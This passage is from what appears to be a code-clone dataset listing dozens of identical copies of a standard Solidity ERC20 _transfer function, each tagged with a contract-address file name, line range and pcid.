    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xA49E5b1422AB286CFC8D54E0A7CBBdb3cd5aBFdB.sol" startline="112" endline="124" pcid="5982">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xE78A151431cC384BC2Dee2dBd5115f58b1A63D6c.sol" startline="107" endline="119" pcid="8370">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x571d1b19e4eaDC8840499d3A408a4CD3fa31f5A6.sol" startline="105" endline="117" pcid="3279">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x0990031433A1C58Ec2A2AFD43154bDD036BA794d.sol" startline="108" endline="120" pcid="283">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x0CB9CDa489aAe64FD4a31D2CD17F70dae5FE4b73.sol" startline="111" endline="123" pcid="336">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xea53c94ea7862c92d0f084d24551fe4f23beb463.sol" startline="107" endline="119" pcid="8490">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xDee33C0f9d5395192ec09e6d4B3753015781C26A.sol" startline="106" endline="118" pcid="7995">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x4c9AE7Cbc12242F162DdeAab10B57Fff01AF836d.sol" startline="108" endline="120" pcid="2888">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x1bF767eC706587F6b3c3f475c8d76692cA19F14b.sol" startline="106" endline="118" pcid="902">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xaE940311F8bBFFfc2B198fFf5019b80b02a4F421.sol" startline="106" endline="118" pcid="6355">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x827f6ADc76821927E8f43ECA46eEC57d4338A421.sol" startline="194" endline="206" pcid="4908">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x1E8203DF1f5488659b9Ff0F39366014Df7d7068D.sol" startline="109" endline="121" pcid="966">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xc09fB61CD91439C2CB8f8554f701c33cECA47a25.sol" startline="111" endline="123" pcid="6901">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xdeE18b2a1ac44f22E4E3Ee3de6AeD146877bCe50.sol" startline="111" endline="123" pcid="7980">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x2C898DEc3Fb5e548b771E1A2DA4230ea7989BFF9.sol" startline="107" endline="119" pcid="1315">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x4751AA52a743FFea38c4031e5158AcfA30347f26.sol" startline="106" endline="118" pcid="2694">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x8af00a1f259F6183e35A21F47a3087489eECBF86.sol" startline="111" endline="123" pcid="5152">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x700ab19C3D9FA23d1A194761eddD9986Aa620293.sol" startline="109" endline="121" pcid="4113">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xA55a6E9BFC3Ba7cb2421146B8F111919bCfB0060.sol" startline="107" endline="119" pcid="6026">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x56b05991e5ed8d0ABD6B60FabdB55e1def0864D8.sol" startline="110" endline="122" pcid="3259">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x41074D4fAe6571188B306Ed26636a00E768E7Bb9.sol" startline="202" endline="214" pcid="2395">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x4cb7fa2798f47c0531601d8fc33a2F1062b9B0c9.sol" startline="111" endline="123" pcid="2903">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x569BFe249181f42c823bEBda9799e1E65f4254B6.sol" startline="110" endline="122" pcid="3244">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x58f43Dc7968012f4DB78EC97A36c9998658ffCcC.sol" startline="106" endline="118" pcid="3350">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xfd1e0ec0d64d806d833b80b8cbd01dfdc9062c3d.sol" startline="111" endline="123" pcid="9235">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x6bd91799f767b30b1f7aeb1239b3573b2e366b49.sol" startline="108" endline="120" pcid="3962">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x033Be8705C262bb2A12da0274297790e9479CCe1.sol" startline="108" endline="120" pcid="146">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x75780415fCA0157e4814A1A2588f1eE9Ff0F7E88.sol" startline="112" endline="124" pcid="4353">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x82f8c11f816693442b3a7d38cfba92abc7f356b0.sol" startline="110" endline="122" pcid="4923">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xa5bf4225edeFe7bdA05825b60D5497e2a5445F1e.sol" startline="108" endline="120" pcid="6041">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x6e45ced3238f28085a8a9e8d93e273013ad9d5a4.sol" startline="107" endline="119" pcid="4052">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x5bf8D2aedA8ECE0373C4F0C5B28633DF3A5aB834.sol" startline="171" endline="183" pcid="3520">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xdea8f0f40066bbc20c044729f08d3c488e4603d8.sol" startline="109" endline="121" pcid="7965">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x0d78d64e0889d8199001868faf1542c90cac768c.sol" startline="212" endline="224" pcid="382">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x346708D8507D3114a1fa26E7f5E11aE1ba50dF2a.sol" startline="111" endline="123" pcid="1647">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x2bc6B9e1b6AE7EDF9a21298Ba0bfe18a166a41d3.sol" startline="110" endline="122" pcid="1300">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xA5cAFA147f5970dc380A90F8eBB5296BD9e4cd57.sol" startline="110" endline="122" pcid="6056">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x13d0A3A7D4Ca790E93874a93ED664a301291bBEe.sol" startline="108" endline="120" pcid="539">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xD1E4a04142D5B5174C6E7129C11740F73d721f5A.sol" startline="108" endline="120" pcid="7508">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xcfd07da825fbc71855ce35cc5953336b23e27a82.sol" startline="108" endline="120" pcid="7433">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xca7d2118fbfaac126a51d403c2f73eff4af97a1a.sol" startline="121" endline="133" pcid="7225">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xea0C5622A2E88392b1edb53e495a28491aC11fBA.sol" startline="113" endline="125" pcid="8475">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x4504921b0d800eca1770f89740b7aaa8f3f57fb9.sol" startline="113" endline="125" pcid="2580">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xc05CA5129c0D91f039B22C3f47FD82077adA63f6.sol" startline="108" endline="120" pcid="6875">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xc49a9fe7c7B41545edfF6B2F2be7662EB588279C.sol" startline="212" endline="224" pcid="7089">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x029D614F344A2a6edE1de8ef4793a3369De927d4.sol" startline="107" endline="119" pcid="102">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xeC7593A6254CE83FA3545B1F44EcDf6C6b85848b.sol" startline="106" endline="118" pcid="8620">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x5fA90D86c0F1a01F1f4aaB2C1a98e45adC5Ee38f.sol" startline="113" endline="125" pcid="3626">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x560506f3a7e8AD0307c07ab44cd1e885bA936575.sol" startline="108" endline="120" pcid="3229">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x837c26F4D6Be1E7466Fe92fE138b8c4af8C59D0C.sol" startline="111" endline="123" pcid="4938">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xa6AC064774bF25B7Ee251C3F051Aabf28A01DCb4.sol" startline="108" endline="120" pcid="6080">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x35539cc6f1f1c0449474fdaaa0939893457163da.sol" startline="109" endline="121" pcid="1790">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x23ffd2f59ec758388282634cda63d6dc1e3120f2.sol" startline="202" endline="214" pcid="1102">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xdBE642963F5e8dF51Ccc6924B2bEfa8930149721.sol" startline="111" endline="123" pcid="7810">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xe87b6341953c64df00df769dc797ea265309fe02.sol" startline="108" endline="120" pcid="8385">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xDe77F59a385B50d78aeB7C646d9dF1E4fD76f1a4.sol" startline="112" endline="124" pcid="7950">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x2AE6bAa928cFeD647807104d4de73aA779a8f433.sol" startline="109" endline="121" pcid="1285">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0xa6Bbb91fC7029E259F590195C21C57D26F480835.sol" startline="110" endline="122" pcid="6095">
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }
</source>
<source file="systems/source-code/0x847d2f49E856550F93f7aADF444528a024256372.sol" startline="111" endline="123" pcid="4953">
